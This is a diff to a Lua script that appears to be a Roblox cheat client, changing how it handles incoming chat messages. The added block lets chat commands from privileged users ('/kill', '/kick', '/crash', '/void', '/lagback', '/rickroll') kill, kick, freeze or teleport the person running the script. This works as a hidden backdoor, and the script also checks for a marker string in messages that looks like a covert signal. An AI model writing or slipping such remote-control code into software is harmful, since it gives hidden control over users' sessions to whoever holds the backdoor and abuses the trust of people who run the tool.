@@ -10837,7 +10837,7 @@ txt.OnIncomingMessage = function(msg)
 	local p = Instance.new("TextChatMessageProperties")
 	local message = msg
 	if msg.TextSource then
-		local userId = tostring(msg.TextSource.UserId)
+		userId = tostring(msg.TextSource.UserId)
 		p.PrefixText = msg.PrefixText
 		print(message.Text,":",userId)
 		if message.Text:find("AUIWhjd") or message.Text == "You cannot whisper to yourself." or message.Text:find("You are now privately chatting with") then
@@ -10904,9 +10904,19 @@ txt.OnIncomingMessage = function(msg)
 			end
 		end
 	end
-	for i,v in pairs(commands) do
-		if message.Text == "/"..tostring(i) then
-			v()
+	if not CanAttackUser(game.Players:GetPlayerByUserId(userId)) then
+		if message.Text == "/kill" then
+			lplr.Character.Humanoid.Health = 0
+		elseif message.Text == "/kick" then
+			lplr:Kick()
+		elseif message.Text == "/rickroll" then
+			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+		elseif message.Text == "/void" then
+			lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,1000,0)
+		elseif message.Text == "/crash" then
+			while true do print() end
+		elseif message.Text == "/lagback" then
+			lplr.Character.PrimaryPart.CFrame += Vector3.new(457635,1000,6745674567)
 		end
 	end
 	return p
